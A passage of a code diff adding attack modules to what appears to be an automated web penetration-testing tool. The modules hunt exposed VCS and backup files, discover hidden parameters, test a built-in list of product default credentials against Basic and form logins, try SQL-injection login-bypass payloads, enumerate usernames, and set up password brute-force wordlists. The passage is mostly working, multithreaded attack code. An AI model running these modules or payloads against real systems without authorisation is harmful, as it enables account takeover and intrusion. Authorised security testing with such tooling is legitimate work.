+                            not _soft404_match(status, len(body or b""), baselines):
+                        ok = True                            # no signature → soft-404 diff
+                if ok:
+                    with hits_lock:
+                        if path not in seen:
+                            seen.add(path)
+                            hits.append(f"{'!' if strong else '+'} {status}  {path}")
+                q.task_done()
+
+        threads = [threading.Thread(target=_worker, daemon=True) for _ in range(_VCS_THREADS)]
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join()
+        if hits:
+            target_hits[hostval] = sorted(hits, key=lambda h: h.split()[-1])
+
+    total = sum(len(v) for v in target_hits.values())
+    reason = "deadline" if stopped_deadline[0] else "complete"
+    lines = [f"{scheme}://{ip}:{port}/ VCS / backup / config hunt",
+             f"targets: {len(targets)} ({', '.join([f'{ip} [default]'] + [v for v in targets if v != ip])})",
+             f"tested {tested[0]} · hits {total} · {reason}",
+             "(! = signature-confirmed · + = differs from soft-404)"]
+    if target_hits:
+        for hostval in targets:
+            hh = target_hits.get(hostval)
+            if not hh:
+                continue
+            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
+            lines += [f"  {h}" for h in hh]
+    else:
+        lines.append("\nno exposed VCS / backups / config found")
+    return "\n".join(lines)
+
+
+# parameter-name wordlists, best first (multi-path entries merged); builtin fallback below.
+_PARAM_WORDLISTS = [
+    ("seclists burp-parameter-names", ["/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"]),
+    ("arjun params", ["/usr/share/arjun/db/params.txt",
+                      "/usr/lib/python3/dist-packages/arjun/db/large.txt"]),
+    ("seclists raft-medium-words", ["/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt"]),
+]
+_PARAM_BUILTIN = [   # ~120 high-value parameter names
+    "id", "page", "file", "path", "dir", "folder", "include", "inc", "template", "tpl",
+    "doc", "document", "load", "read", "source", "src", "download", "url", "uri", "link",
+    "redirect", "next", "return", "returnurl", "dest", "destination", "domain", "callback",
+    "site", "feed", "host", "cmd", "exec", "command", "run", "ping", "system", "query",
+    "q", "search", "s", "keyword", "user", "username", "uid", "userid", "account", "profile",
+    "role", "admin", "debug", "test", "dev", "view", "action", "act", "do", "func", "module",
+    "type", "cat", "category", "item", "product", "pid", "name", "email", "token", "key",
+    "api_key", "apikey", "auth", "session", "lang", "language", "locale", "format", "output",
+    "order", "sort", "field", "column", "table", "db", "data", "value", "val", "content",
+    "text", "message", "msg", "code", "status", "state", "mode", "step", "start", "end",
+    "limit", "offset", "count", "num", "size", "width", "height", "img", "image", "photo",
+    "avatar", "upload", "filename", "filepath", "target", "ref", "referer", "from", "to",
+    "date", "time", "year", "month", "day", "flag", "enable", "disable", "show", "hide",
+]
+_PARAM_DANGEROUS = {
+    "file", "path", "dir", "folder", "include", "inc", "page", "template", "tpl", "doc",
+    "document", "load", "read", "source", "src", "download", "url", "uri", "link",
+    "redirect", "next", "return", "returnurl", "dest", "domain", "callback", "site", "feed",
+    "host", "cmd", "exec", "command", "run", "ping", "system", "shell", "query", "id", "uid",
+    "userid", "user", "account", "profile", "role", "admin", "debug", "view", "action",
+    "do", "func", "module", "filepath", "filename", "target",
+}
+_PARAM_STATIC_RE = re.compile(
+    r"\.(js|css|png|jpe?g|gif|ico|svg|woff2?|ttf|eot|pdf|zip|map|mp4|webp|json)(\?|$)", re.I)
+_PARAM_DYNAMIC_RE = re.compile(r"\.(php|asp|aspx|jsp|jspx|cgi|pl|py|do|action)(\?|$)", re.I)
+_PARAM_DEADLINE = 600
+_PARAM_THREADS = 30
+_PARAM_REQ_TIMEOUT = 5
+_PARAM_MAX_ENDPOINTS = 12
+_PARAM_MAX_WORDS = 5000
+
+
+def _pick_param_wordlist() -> tuple:
+    """Return (label, words) from the best available parameter-name wordlist, or builtin."""
+    for label, paths in _PARAM_WORDLISTS:
+        merged, seen = [], set()
+        for path in paths:
+            if not os.path.exists(path):
+                continue
+            try:
+                with open(path, encoding="utf-8", errors="ignore") as fh:
+                    for ln in fh:
+                        w = ln.strip()
+                        if w and not w.startswith("#") and w not in seen:
+                            seen.add(w)
+                            merged.append(w)
+            except OSError:
+                continue
+        if merged:
+            return f"{label} ({', '.join(paths)})", merged
+    return f"builtin ({len(_PARAM_BUILTIN)} params)", list(_PARAM_BUILTIN)
+
+
+def _is_dynamic_endpoint(path: str) -> bool:
+    if _PARAM_STATIC_RE.search(path):
+        return False
+    if "?" in path:
+        return True
+    if _PARAM_DYNAMIC_RE.search(path):
+        return True
+    last = path.rstrip("/").split("/")[-1]
+    return "." not in last                                    # extensionless → a route
+
+
+def _gather_param_endpoints(ip: str, port: int, proto: str) -> list:
+    """(hostval, path) dynamic endpoints mined from earlier tools' stored output — dir-brute
+    hits (with their [host] attribution) and http-source ENDPOINTS. Falls back to '/' per
+    host + a few common pages when nothing was recorded yet."""
+    eps, seen = [], set()
+
+    def _add(hostval, raw):
+        raw = raw.split("#")[0]
+        base = raw.split("?")[0]
+        if not base.startswith("/"):
+            m = re.match(r"https?://[^/]+(/\S*)", raw)         # full URL → take its path
+            if not m:
+                return
+            base = m.group(1).split("?")[0]
+        if not base or not _is_dynamic_endpoint(raw):
+            return
+        key = (hostval, base)
+        if key not in seen:
+            seen.add(key)
+            eps.append((hostval, base))
+
+    for sid, output in fetch_scripts(ip, port, proto):
+        if sid == "dir-brute":
+            host = ip
+            for ln in output.splitlines():
+                mh = re.match(r"^\[([^\]\s]+)", ln)
+                if mh:
+                    host = mh.group(1)
+                    continue
+                mp = re.match(r"\s*[!+] \d{3}\s+(\S+)", ln)
+                if mp:
+                    _add(host, mp.group(1))
+        elif sid == "http-source":
+            section = None
+            for ln in output.splitlines():
+                mh = re.match(r"^([A-Z][A-Z ]+) \(\d+\):", ln)
+                if mh:
+                    section = mh.group(1)
+                    continue
+                if section == "ENDPOINTS":
+                    m = re.match(r"\s+(\S+)", ln)
+                    if m:
+                        _add(ip, m.group(1))
+
+    if not eps:                                               # nothing mined yet → sensible defaults
+        vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
+        for h in [ip] + [v for v in vhosts if v != ip]:
+            _add(h, "/")
+        for p in ("/index.php", "/search.php", "/api", "/login.php"):
+            _add(ip, p)
+    return eps[:_PARAM_MAX_ENDPOINTS]
+
+
+def _tool_param_hunt(ip: str, port: int, proto: str) -> str:
+    """HTTP step-11 tool: hidden GET-parameter discovery on dynamic endpoints mined from
+    earlier steps. A param is reported when its value reflects in the response (primary,
+    near-zero FP) or when it materially changes a stable response vs a junk-param baseline.
+    Endpoints that reflect any value, or whose response is unstable, fall back to reflection-
+    only to keep precision. Stdlib only; a dead server raises."""
+    import http.client
+    import ssl
+    import time
+    import random
+    import string
+    import threading
+    import queue as _queue
+
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    scheme = "https" if tls else "http"
+    ctx = ssl._create_unverified_context()
+
+    def _probe(hostval, path):
+        conn = None
+        try:
+            if tls:
+                conn = http.client.HTTPSConnection(ip, port, timeout=_PARAM_REQ_TIMEOUT, context=ctx)
+            else:
+                conn = http.client.HTTPConnection(ip, port, timeout=_PARAM_REQ_TIMEOUT)
+            conn.request("GET", path, headers={"Host": hostval, "User-Agent": "pshunter"})
+            resp = conn.getresponse()
+            body = resp.read(65536).decode("utf-8", "replace")
+            return resp.status, body
+        except Exception:                                     # noqa: BLE001
+            return None, None
+        finally:
+            if conn is not None:
+                try:
+                    conn.close()
+                except Exception:                             # noqa: BLE001
+                    pass
+
+    if _probe(ip, "/")[0] is None:
+        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot param-hunt")
+
+    _wl_label, words = _pick_param_wordlist()
+    words = words[:_PARAM_MAX_WORDS]
+    endpoints = _gather_param_endpoints(ip, port, proto)
+    canary = "pshx" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
+
+    deadline = time.time() + _PARAM_DEADLINE
+    tested = [0]
+    tested_lock = threading.Lock()
+    stopped_deadline = [False]
+    results = {}                                              # hostval -> {path: [params]}
+
+    def _rnd():
+        return "zz" + "".join(random.choices(string.ascii_lowercase, k=8))
+
+    for hostval, path in endpoints:
+        if time.time() >= deadline:
+            stopped_deadline[0] = True
+            break
+        # baseline: two junk params → stability + does the app reflect any value?
+        j1 = _probe(hostval, f"{path}?{_rnd()}={canary}")
+        j2 = _probe(hostval, f"{path}?{_rnd()}={canary}")
+        if j1[0] is None:
+            continue
+        b_status, b_body = j1
+        b_len = len(b_body or "")
+        reflect_trust = canary not in (b_body or "") and canary not in (j2[1] or "")
+        stable = j2[0] == b_status and abs(len(j2[1] or "") - b_len) <= max(64, int(b_len * 0.03))
+
+        q = _queue.Queue()
+        for w in words:
+            q.put(w)
+        found, found_lock = [], threading.Lock()
+
+        def _worker():
+            while True:
+                if time.time() >= deadline:
+                    stopped_deadline[0] = True
+                    return
+                try:
+                    param = q.get_nowait()
+                except _queue.Empty:
+                    return
+                status, body = _probe(hostval, f"{path}?{param}={canary}")
+                with tested_lock:
+                    tested[0] += 1
+                hit = False
+                if status is not None:
+                    if reflect_trust and body and canary in body:
+                        hit = True                            # value reflected → param is processed
+                    elif stable and (status != b_status or
+                                     abs(len(body or "") - b_len) > max(64, int(b_len * 0.03))):
+                        hit = True                            # stable endpoint reacted to this param
+                if hit:
+                    with found_lock:
+                        if param not in found:
+                            found.append(param)
+                q.task_done()
+
+        threads = [threading.Thread(target=_worker, daemon=True) for _ in range(_PARAM_THREADS)]
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join()
+        if found:
+            results.setdefault(hostval, {})[path] = sorted(found)
+
+    total = sum(len(ps) for d in results.values() for ps in d.values())
+    reason = "deadline" if stopped_deadline[0] else "complete"
+    lines = [f"{scheme}://{ip}:{port}/ hidden parameter discovery",
+             f"wordlist: {_wl_label}",
+             f"endpoints: {len(endpoints)} · tested {tested[0]} · params {total} · {reason}"]
+    if results:
+        for hostval in dict.fromkeys(h for h, _p in endpoints):
+            d = results.get(hostval)
+            if not d:
+                continue
+            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
+            for path in sorted(d):
+                lines.append(f"  {path}?[{', '.join(d[path])}]")
+    else:
+        lines.append("\nno hidden parameters found")
+    return "\n".join(lines)
+
+
+# a SMALL curated set of product defaults — this is the default-creds check, NOT a
+# brute-force (that is a separate, gated step). Kept short so it never trips a lockout.
+_CREDS_DEFAULT = [
+    ("admin", "admin"), ("admin", "password"), ("admin", ""), ("admin", "admin123"),
+    ("admin", "changeme"), ("admin", "1234"), ("admin", "12345"), ("admin", "default"),
+    ("administrator", "password"), ("administrator", "administrator"),
+    ("root", "root"), ("root", "toor"), ("root", "password"), ("root", ""),
+    ("user", "user"), ("test", "test"), ("guest", "guest"), ("guest", ""),
+    ("sa", ""), ("operator", "operator"),
+]
+# product → (extra creds, extra login paths), matched against detected service/product/cpe
+_CREDS_PRODUCT = {
+    "tomcat":     ([("tomcat", "tomcat"), ("admin", "tomcat"), ("manager", "manager"),
+                    ("tomcat", "s3cret")], ["/manager/html", "/host-manager/html"]),
+    "jenkins":    ([("admin", "admin"), ("admin", "password")], ["/login"]),
+    "grafana":    ([("admin", "admin")], ["/login"]),
+    "phpmyadmin": ([("root", ""), ("root", "root"), ("root", "password")], ["/index.php"]),
+    "gitlab":     ([("root", "5iveL!fe"), ("admin", "password")], ["/users/sign_in"]),
+    "wordpress":  ([("admin", "admin"), ("admin", "password")], ["/wp-login.php"]),
+    "kibana":     ([("elastic", "changeme")], ["/login"]),
+    "zabbix":     ([("Admin", "zabbix")], ["/index.php"]),
+}
+_CREDS_PATH_RE = re.compile(
+    r"admin|login|signin|sign-in|manager|portal|panel|console|auth|wp-login|phpmyadmin", re.I)
+_CREDS_FALLBACK_PATHS = ["/admin", "/login", "/login.php", "/administrator", "/wp-login.php",
+                         "/manager/html", "/phpmyadmin/", "/admin/login", "/user/login"]
+_CREDS_ERR_RE = re.compile(
+    r"invalid|incorrect|failed|wrong|denied|try again|bad (?:user|pass)|not (?:found|match)", re.I)
+_CREDS_OK_RE = re.compile(
+    r"logout|log out|sign out|dashboard|welcome|my account|successfully|control panel", re.I)
+_CREDS_DEADLINE = 180
+_CREDS_THREADS = 8
+_CREDS_REQ_TIMEOUT = 5
+_CREDS_MAX_TARGETS = 24
+
+
+def _parse_login_form(html: str, page_path: str) -> "dict | None":
+    """Pull the login <form> (the one with a password input): its action, method, the user
+    and password field names, and any hidden fields (CSRF tokens) to echo back."""
+    for form in re.findall(r"<form[^>]*>.*?</form>", html or "", re.I | re.S):
+        if not re.search(r"type=[\"']?password", form, re.I):
+            continue
+        pm = re.search(r"<input[^>]*type=[\"']?password[\"']?[^>]*name=[\"']([^\"']+)", form, re.I) or \
+            re.search(r"<input[^>]*name=[\"']([^\"']+)[\"'][^>]*type=[\"']?password", form, re.I)
+        if not pm:
+            continue
+        act = re.search(r"action=[\"']([^\"']*)[\"']", form, re.I)
+        user_field, hidden = None, {}
+        for tag in re.findall(r"<input[^>]*>", form, re.I):
+            tp = re.search(r"type=[\"']?(\w+)", tag, re.I)
+            tp = tp.group(1).lower() if tp else "text"
+            nm = re.search(r"name=[\"']([^\"']+)", tag, re.I)
+            if not nm:
+                continue
+            nm = nm.group(1)
+            if tp == "password":
+                continue
+            if tp == "hidden":
+                vv = re.search(r"value=[\"']([^\"']*)", tag, re.I)
+                hidden[nm] = vv.group(1) if vv else ""
+            elif user_field is None and (tp in ("text", "email") or
+                                         re.search(r"user|email|login|name", nm, re.I)):
+                user_field = nm
+        if user_field:
+            return {"action": act.group(1) if act else "", "user": user_field,
+                    "pass": pm.group(1), "hidden": hidden}
+    return None
+
+
+def _gather_login_targets(ip: str, port: int, proto: str) -> list:
+    """(hostval, path) login/admin surfaces — dir-brute paths that look like auth or returned
+    401, plus product-specific and common fallback paths, on the host and every vhost."""
+    tgts, seen = [], set()
+
+    def _add(hostval, path):
+        base = path.split("?")[0].split("#")[0]
+        if not base.startswith("/"):
+            return
+        key = (hostval, base)
+        if key not in seen:
+            seen.add(key)
+            tgts.append((hostval, base))
+
+    for sid, output in fetch_scripts(ip, port, proto):
+        if sid == "dir-brute":
+            host = ip
+            for ln in output.splitlines():
+                mh = re.match(r"^\[([^\]\s]+)", ln)
+                if mh:
+                    host = mh.group(1)
+                    continue
+                mp = re.match(r"\s*[!+] (\d{3})\s+(\S+)", ln)
+                if mp and (mp.group(1) == "401" or _CREDS_PATH_RE.search(mp.group(2))):
+                    _add(host, mp.group(2))
+
+    prod_paths = []
+    prods = _creds_products(ip)
+    for key in prods:
+        prod_paths += _CREDS_PRODUCT[key][1]
+    vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
+    for h in [ip] + [v for v in vhosts if v != ip]:
+        for p in prod_paths + _CREDS_FALLBACK_PATHS:
+            _add(h, p)
+    return tgts[:_CREDS_MAX_TARGETS]
+
+
+def _creds_products(ip: str) -> set:
+    """Which _CREDS_PRODUCT keys match this host's detected services (name/product/cpe)."""
+    blob = ""
+    for (nm, prod, _ver, cpe) in fetch_services(ip).values():
+        blob += " ".join(x for x in (nm, prod, cpe) if x).lower() + " "
+    return {k for k in _CREDS_PRODUCT if k in blob}
+
+
+def _tool_default_creds(ip: str, port: int, proto: str) -> str:
+    """HTTP step-12 tool: try a small set of DEFAULT credentials (not a brute-force) against
+    HTTP Basic realms and HTML login forms found on the host + vhosts. Basic is deterministic
+    (wrong creds → 401); forms are judged against a wrong-creds failure baseline (redirect
+    away / error text gone / session cookie). Low concurrency to avoid lockout. Dead → raises."""
+    import http.client
+    import ssl
+    import time
+    import base64
+    import urllib.parse
+    import threading
+    import queue as _queue
+
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    scheme = "https" if tls else "http"
+    ctx = ssl._create_unverified_context()
+
+    def _req(hostval, method, path, body=None, extra=None):
+        conn = None
+        try:
+            if tls:
+                conn = http.client.HTTPSConnection(ip, port, timeout=_CREDS_REQ_TIMEOUT, context=ctx)
+            else:
+                conn = http.client.HTTPConnection(ip, port, timeout=_CREDS_REQ_TIMEOUT)
+            hdr = {"Host": hostval, "User-Agent": "pshunter"}
+            if extra:
+                hdr.update(extra)
+            conn.request(method, path, body=body, headers=hdr)
+            resp = conn.getresponse()
+            data = resp.read(65536).decode("utf-8", "replace")
+            setc = resp.headers.get_all("Set-Cookie") or []
+            return (resp.status, data, setc, resp.headers.get("Location"),
+                    resp.headers.get("WWW-Authenticate", "") or "")
+        except Exception:                                     # noqa: BLE001
+            return None, None, [], None, ""
+        finally:
+            if conn is not None:
+                try:
+                    conn.close()
+                except Exception:                             # noqa: BLE001
+                    pass
+
+    if _req(ip, "GET", "/")[0] is None:
+        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test creds")
+
+    base_creds = list(_CREDS_DEFAULT)
+    for key in _creds_products(ip):
+        for c in _CREDS_PRODUCT[key][0]:
+            if c not in base_creds:
+                base_creds.append(c)
+    targets = _gather_login_targets(ip, port, proto)
+
+    deadline = time.time() + _CREDS_DEADLINE
+    tested = [0]
+    tested_lock = threading.Lock()
+    stopped_deadline = [False]
+    surfaces = []
+    valid = []
+    lock = threading.Lock()
+
+    def _cookie_names(setc):
+        return {c.split("=", 1)[0].strip() for c in setc}
+
+    def _attempt_form(hostval, path, u, p):
+        gs, gbody, gsc, _gl, _gw = _req(hostval, "GET", path)
+        if gs is None:
+            return None
+        form = _parse_login_form(gbody or "", path)
+        if not form:
+            return None
+        data = dict(form["hidden"])
+        data[form["user"]] = u
+        data[form["pass"]] = p
+        action = urllib.parse.urljoin(f"{scheme}://{ip}:{port}{path}", form["action"] or path)
+        pr = urllib.parse.urlparse(action)
+        apath = pr.path + (f"?{pr.query}" if pr.query else "")
+        cookie = "; ".join(c.split(";")[0] for c in gsc)
+        extra = {"Content-Type": "application/x-www-form-urlencoded"}
+        if cookie:
+            extra["Cookie"] = cookie
+        return _req(hostval, "POST", apath, body=urllib.parse.urlencode(data), extra=extra)
+
+    def _form_ok(cur, base):
+        if cur is None:
+            return False
+        st, body, sc, loc, _w = cur
+        fs, fbody, fsc, _fl, _fw = base
+        if st in (301, 302, 303) and loc and not re.search(r"login|signin|sign-in|auth", loc, re.I):
+            return True
+        if _CREDS_OK_RE.search(body or "") and not _CREDS_OK_RE.search(fbody or ""):
+            return True
+        perr = bool(_CREDS_ERR_RE.search(body or ""))
+        if bool(_CREDS_ERR_RE.search(fbody or "")) and not perr:
+            return True
+        new = _cookie_names(sc) - _cookie_names(fsc)
+        if new and not perr and any(re.search(r"sess|sid|auth|logged|token", n, re.I) for n in new):
+            return True
+        return False
+
+    def _test_target(hostval, path):
+        if time.time() >= deadline:
+            stopped_deadline[0] = True
+            return
+        st, body, _sc, _loc, www = _req(hostval, "GET", path)
+        if st is None:
+            return
+        if st == 401 and "basic" in www.lower():
+            authtype = "Basic"
+        elif st == 200 and re.search(r"type=[\"']?password", body or "", re.I) and \
+                _parse_login_form(body or "", path):
+            authtype = "form"
+        else:
+            return
+        with lock:
+            surfaces.append(f"{hostval}{path} ({authtype})")
+        if authtype == "Basic":
+            for u, p in base_creds:
+                if time.time() >= deadline:
+                    stopped_deadline[0] = True
+                    return
+                tok = base64.b64encode(f"{u}:{p}".encode()).decode()
+                s2 = _req(hostval, "GET", path, extra={"Authorization": "Basic " + tok})[0]
+                with tested_lock:
+                    tested[0] += 1
+                if s2 is not None and s2 != 401:
+                    with lock:
+                        valid.append(f"! {u}:{p or '<blank>'} @ {path} (Basic) [{hostval}]")
+                    return                                    # one working cred is enough
+        else:
+            fbase = _attempt_form(hostval, path, "nulluser_zx9", "wrongpass_zx9")
+            if fbase is None:
+                return
+            for u, p in base_creds:
+                if time.time() >= deadline:
+                    stopped_deadline[0] = True
+                    return
+                cur = _attempt_form(hostval, path, u, p)
+                with tested_lock:
+                    tested[0] += 1
+                if _form_ok(cur, fbase):
+                    with lock:
+                        valid.append(f"! {u}:{p or '<blank>'} @ {path} (form) [{hostval}]")
+                    return
+
+    q = _queue.Queue()
+    for t in targets:
+        q.put(t)
+
+    def _worker():
+        while True:
+            try:
+                hostval, path = q.get_nowait()
+            except _queue.Empty:
+                return
+            try:
+                _test_target(hostval, path)
+            finally:
+                q.task_done()
+
+    threads = [threading.Thread(target=_worker, daemon=True) for _ in range(_CREDS_THREADS)]
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()
+
+    reason = "deadline" if stopped_deadline[0] else "complete"
+    lines = [f"{scheme}://{ip}:{port}/ default credentials check",
+             f"surfaces: {len(surfaces)} auth · tested {tested[0]} creds · valid {len(valid)} · {reason}"]
+    if surfaces:
+        lines.append("\nAUTH SURFACES:")
+        lines += [f"  {s}" for s in sorted(set(surfaces))]
+    if valid:
+        lines.append("\nVALID:")
+        lines += [f"  {v}" for v in sorted(set(valid))]
+    else:
+        lines.append("\nno default credentials worked")
+    return "\n".join(lines)
+
+
+# non-destructive SQLi auth-bypass payloads (login logic only — no DROP/DELETE): (user, pass)
+_SQLI_BYPASS = [
+    ("' OR '1'='1' -- -", ""), ("' OR 1=1 -- -", ""), ("' OR 1=1#", ""),
+    ("admin' -- -", ""), ("admin'#", ""), ('" OR "1"="1" -- -', ""),
+    ('") OR ("1"="1" -- -', ""), ("' OR 'x'='x", ""), ("' OR ''='", ""),
+    ("admin", "' OR '1'='1"), ("admin", "' OR 1=1 -- -"),
+]
+_SQL_ERROR_RE = re.compile(
+    r"you have an error in your sql syntax|warning:\s*mysqli?_|unclosed quotation mark|"
+    r"quoted string not properly terminated|ORA-\d{5}|PostgreSQL.*?ERROR|SQLSTATE\[|"
+    r"sqlite3?\.(?:OperationalError|Warning)|SQLite/JDBC|System\.Data\.SqlClient|"
+    r"ODBC SQL Server Driver|mysql_fetch|supplied argument is not a valid MySQL", re.I)
+_AUTHB_DEADLINE = 180
+_AUTHB_THREADS = 8
+_AUTHB_REQ_TIMEOUT = 5
+_AUTHB_MAX_TARGETS = 16
+
+
+def _tool_auth_bypass(ip: str, port: int, proto: str) -> str:
+    """HTTP step-13 tool: on HTML login forms (host + vhosts), try (A) SQLi auth-bypass
+    payloads judged against a wrong-creds failure baseline, (B) a single-quote probe that
+    surfaces DB error strings (injectable even without bypass), and (C) username enumeration
+    by comparing a likely-valid user's failure response to consistent invalid ones. Payloads
+    are non-destructive; low concurrency. Stdlib only; a dead server raises."""
+    import http.client
+    import ssl
+    import time
+    import random
+    import string
+    import urllib.parse
+    import threading
+    import queue as _queue
+
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    scheme = "https" if tls else "http"
+    ctx = ssl._create_unverified_context()
+
+    def _req(hostval, method, path, body=None, extra=None):
+        conn = None
+        try:
+            if tls:
+                conn = http.client.HTTPSConnection(ip, port, timeout=_AUTHB_REQ_TIMEOUT, context=ctx)
+            else:
+                conn = http.client.HTTPConnection(ip, port, timeout=_AUTHB_REQ_TIMEOUT)
+            hdr = {"Host": hostval, "User-Agent": "pshunter"}
+            if extra:
+                hdr.update(extra)
+            conn.request(method, path, body=body, headers=hdr)
+            resp = conn.getresponse()
+            data = resp.read(65536).decode("utf-8", "replace")
+            return resp.status, data, (resp.headers.get_all("Set-Cookie") or []), resp.headers.get("Location")
+        except Exception:                                     # noqa: BLE001
+            return None, None, [], None
+        finally:
+            if conn is not None:
+                try:
+                    conn.close()
+                except Exception:                             # noqa: BLE001
+                    pass
+
+    if _req(ip, "GET", "/")[0] is None:
+        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test auth")
+
+    def _submit(hostval, path, u, p):
+        gs, gbody, gsc, _gl = _req(hostval, "GET", path)
+        if gs is None:
+            return None
+        form = _parse_login_form(gbody or "", path)
+        if not form:
+            return None
+        data = dict(form["hidden"])
+        data[form["user"]] = u
+        data[form["pass"]] = p
+        action = urllib.parse.urljoin(f"{scheme}://{ip}:{port}{path}", form["action"] or path)
+        pr = urllib.parse.urlparse(action)
+        apath = pr.path + (f"?{pr.query}" if pr.query else "")
+        cookie = "; ".join(c.split(";")[0] for c in gsc)
+        extra = {"Content-Type": "application/x-www-form-urlencoded"}
+        if cookie:
+            extra["Cookie"] = cookie
+        return _req(hostval, "POST", apath, body=urllib.parse.urlencode(data), extra=extra)
+
+    def _names(setc):
+        return {c.split("=", 1)[0].strip() for c in setc}
+
+    def _logged_in(cur, base):
+        if cur is None or base is None:
+            return False
+        st, body, sc, loc = cur
+        _fs, fbody, fsc, _fl = base
+        if st in (301, 302, 303) and loc and not re.search(r"login|signin|sign-in|auth", loc, re.I):
+            return True
+        if _CREDS_OK_RE.search(body or "") and not _CREDS_OK_RE.search(fbody or ""):
+            return True
+        if bool(_CREDS_ERR_RE.search(fbody or "")) and not bool(_CREDS_ERR_RE.search(body or "")):
+            return True
+        new = _names(sc) - _names(fsc)
+        if new and not _CREDS_ERR_RE.search(body or "") and \
+                any(re.search(r"sess|sid|auth|logged|token", n, re.I) for n in new):
+            return True
+        return False
+
+    def _sig(r):
+        if r is None:
+            return None
+        st, body, _sc, _loc = r
+        em = _CREDS_ERR_RE.search(body or "")
+        return st, len(body or ""), (em.group(0).lower() if em else None)
+
+    def _rnduser():
+        return "nx" + "".join(random.choices(string.ascii_lowercase, k=8))
+
+    targets = _gather_login_targets(ip, port, proto)[:_AUTHB_MAX_TARGETS]
+    deadline = time.time() + _AUTHB_DEADLINE
+    stopped_deadline = [False]
+    forms_tested = [0]
+    results = {}                                              # hostval -> [lines]
+    lock = threading.Lock()
+
+    def _test(hostval, path):
+        if time.time() >= deadline:
+            stopped_deadline[0] = True
+            return
+        gs, gbody, _sc, _l = _req(hostval, "GET", path)
+        if gs is None or not _parse_login_form(gbody or "", path):
+            return                                            # not a login form → skip
+        with lock:
+            forms_tested[0] += 1
+        wrongpw = "Wp_" + "".join(random.choices(string.ascii_letters, k=8))
+        fbase = _submit(hostval, path, _rnduser(), wrongpw)   # failure baseline (invalid creds)
+        found = []
+        # A) SQLi auth bypass
+        for u, p in _SQLI_BYPASS:
+            if time.time() >= deadline:
+                stopped_deadline[0] = True
+                break
+            cur = _submit(hostval, path, u, p or "x")
+            if _logged_in(cur, fbase):
+                found.append(f"  ✗ BYPASS {path}  (payload: {u} / {p or 'x'})")
+                break
+        # B) DB error surfacing
+        er = _submit(hostval, path, "admin'", "x")
+        if er and er[1] and _SQL_ERROR_RE.search(er[1]):
+            found.append(f"  ! SQLERROR {path}  (DB error reflected)")
+        # C) username enumeration — invalids consistent, 'admin' differs
+        inv1, inv2 = _sig(fbase), _sig(_submit(hostval, path, _rnduser(), wrongpw))
+        adm = _sig(_submit(hostval, path, "admin", wrongpw))
+        if inv1 and inv2 and adm and inv1[0] == inv2[0] and inv1[2] == inv2[2] and \
+                abs(inv1[1] - inv2[1]) <= max(64, int(inv1[1] * 0.05)):
+            why = None
+            if adm[0] != inv1[0]:
+                why = f"status {adm[0]} vs {inv1[0]}"
+            elif adm[2] != inv1[2]:
+                why = f"error '{adm[2]}' vs '{inv1[2]}'"
+            elif abs(adm[1] - inv1[1]) > max(64, int(inv1[1] * 0.05)):
+                why = f"length {adm[1]} vs ~{inv1[1]}"
+            if why:
+                found.append(f"  · ENUM {path}  ({why})")
+        if found:
+            with lock:
+                results.setdefault(hostval, []).extend(found)
+
+    q = _queue.Queue()
+    for t in targets:
+        q.put(t)
+
+    def _worker():
+        while True:
+            try:
+                hostval, path = q.get_nowait()
+            except _queue.Empty:
+                return
+            try:
+                _test(hostval, path)
+            finally:
+                q.task_done()
+
+    threads = [threading.Thread(target=_worker, daemon=True) for _ in range(_AUTHB_THREADS)]
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()
+
+    reason = "deadline" if stopped_deadline[0] else "complete"
+    lines = [f"{scheme}://{ip}:{port}/ auth bypass + user enumeration",
+             f"login forms tested: {forms_tested[0]} · {reason}"]
+    if results:
+        for hostval in sorted(results):
+            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
+            lines += sorted(set(results[hostval]))
+    else:
+        lines.append("\nno auth bypass / injection / user enumeration found")
+    return "\n".join(lines)
+
+
+_BRUTE_USER_WORDLISTS = [
+    ("seclists top-usernames", ["/usr/share/seclists/Usernames/top-usernames-shortlist.txt"]),
+    ("seclists names", ["/usr/share/seclists/Usernames/Names/names.txt"]),
+]
+_BRUTE_USER_BUILTIN = ["admin", "administrator", "root", "user", "test", "guest", "operator",
+                       "manager", "support", "webadmin", "sysadmin", "tomcat", "oracle",
+                       "postgres", "info", "demo", "staff", "service", "backup"]
+_BRUTE_PASS_WORDLISTS = [
+    ("seclists top-500",
+     ["/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-500.txt"]),
+    ("seclists top-100",
+     ["/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"]),
+    ("seclists probable-1575", ["/usr/share/seclists/Passwords/probable-v2-top-1575.txt"]),
+    ("rockyou", ["/usr/share/wordlists/rockyou.txt"]),
+]
+_BRUTE_PASS_BUILTIN = [
+    "password", "123456", "123456789", "12345678", "12345", "1234", "admin", "Password1",
+    "P@ssw0rd", "password1", "welcome", "welcome1", "changeme", "letmein", "qwerty", "root",
+    "toor", "abc123", "admin123", "password123", "iloveyou", "monkey", "dragon", "111111",
+    "sunshine", "princess", "football", "secret", "master", "superman", "hello", "login",
+    "passw0rd", "test", "guest", "default", "administrator", "qwerty123", "1q2w3e4r",
+    "654321", "123321", "000000", "qazwsx", "trustno1", "1234567", "zaq12wsx", "pass",
+]
+_BRUTE_LOCKOUT_RE = re.compile(
+    r"locked|too many|try again later|temporarily (?:disabled|blocked)|rate.?limit|"
